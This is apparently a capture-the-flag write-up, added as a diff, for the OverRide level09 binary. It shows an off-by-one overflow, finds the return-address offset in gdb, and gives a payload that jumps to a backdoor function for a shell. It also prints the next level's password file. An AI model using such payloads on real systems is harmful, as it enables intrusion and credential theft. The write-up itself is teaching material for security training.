@@ -1,0 +1,53 @@
+in this code we notice that the username is long 40
+but 41 characters are copied during the for loop, so
+we can overwrite the size with: '\xff' * 41
+
+
+then we can now copy more than the possible in msg to get an offset
+for eip so:
+
+
+level09@OverRide:~$ python -c "print('\xff' * 41 + '\n' + 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraabraabsaabtaabuaabvaabwaaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaacqaacraacsaactaacuaacvaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac')" > /tmp/test
+
+level09@OverRide:~$ gdb level09
+(gdb) r < /tmp/test
+Starting program: /home/users/level09/level09 < /tmp/test
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, >: Msg @Unix-Dude
+>>: >: Msg sent!
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000555555554931 in handle_msg ()
+
+(gdb) i f
+Stack level 0, frame at 0x7fffffffe5c8:
+ rip = 0x555555554931 in handle_msg; saved rip 0x6261616f6261616e
+ called by frame at 0x7fffffffe5d8
+ Arglist at 0x6261616d6261616c, args:
+ Locals at 0x6261616d6261616c, Previous frame's sp is 0x7fffffffe5d0
+ Saved registers:
+  rip at 0x7fffffffe5c8
+
+so "naaboaab" -> offset 200
+now we need the address of secret_backdoor
+and then well put /bin/sh
+
+(gdb) x /x secret_backdoor
+0x55555555488c <secret_backdoor>:       0xe5894855
+
+0x000055555555488c -> '\x8c\x48\x55\x55\x55\x55\x00\x00'
+
+level09@OverRide:~$ python -c "print('\xff'*41 + '\n' + 'A'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n' + '/bin/sh')" > /tmp/exploit
+level09@OverRide:~$ cat /tmp/exploit - | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, >: Msg @Unix-Dude
+>>: >: Msg sent!
+cat /home/users/end/.pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
